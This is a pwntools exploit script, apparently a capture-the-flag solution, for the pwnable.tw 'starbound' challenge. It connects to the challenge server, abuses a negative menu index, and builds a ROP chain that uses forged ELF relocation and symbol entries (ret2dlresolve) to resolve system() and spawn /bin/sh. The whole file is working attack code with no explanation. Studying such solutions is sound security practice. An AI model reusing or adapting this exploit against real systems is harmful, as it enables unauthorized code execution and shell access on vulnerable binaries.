from pwn import *
context.arch = 'i386'

def settings():
    p.sendlineafter(b'> ', b'6')

def setname(name):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'name: ', name)

def callmyname(payload=None):
    if payload == None:
        p.sendlineafter(b'> ', b'-33')
    else:
        p.sendafter(b'> ', b'-33\0' + payload)

# gadget
add_esp_0x1c    = 0x08048e48
pop_ebx_esi_edi = 0x080494da

# useful address
read_plt   = 0x08048a70
resolver   = 0x08048940
playername = 0x080580D0
rel_plt    = 0x80487c8
dyn_sym    = 0x80481dc
dyn_str    = 0x80484fc
fakedynsym = 0x805848c

# p = process('./starbound')
elf=ELF("starbound")
p = remote('chall.pwnable.tw', 10202)

settings()
# r_info = ((playername + 4 * 3 - dyn_sym) // 0x10) << 8 # GG
r_info = ((fakedynsym - dyn_sym) // 0x10) << 8           # Bypass this: https://elixir.bootlin.com/glibc/glibc-2.23/source/elf/dl-runtime.c#L215
r_info |= 0x7
payload  = p32(add_esp_0x1c) # locate at 0x080580D0
payload += p32(playername)   # Elf32_Rel.r_offset 4B
payload += p32(r_info)       # Elf32_Rel.r_info   4B
payload += b'\x87'
assert(len(payload) < 0x64)
setname(payload)

reloc_arg = (playername + 4) - rel_plt # system@plt
rop_chain = flat(
    read_plt,
    pop_ebx_esi_edi,
    0,
    fakedynsym,
    0x100,
    resolver,
    reloc_arg,
    0x8787, # garbage
    fakedynsym + 4*4 + 7
)
payload  = b'\x87' * 4
payload += rop_chain
assert(len(payload) < 0x100)
callmyname(payload)

st_name = fakedynsym + 4 * 4 - dyn_str
payload  = p32(st_name)      # Elf32_Sym.st_name  4B ; addr: fakedynsym
payload += p32(0)            # Elf32_Sym.st_value 4B
payload += p32(0)            # Elf32_Sym.st_size  4B
payload += p8(0)             # Elf32_Sym.st_info  1B
payload += p8(0)             # Elf32_Sym.st_other 1B
payload += p16(0)            # Elf32_Sym.st_shndx 2B
payload += b'system\0'       # dynstr
payload += b'/bin/sh\0'      # system args
assert(len(payload) <= 0x100)
p.send(payload)

p.interactive()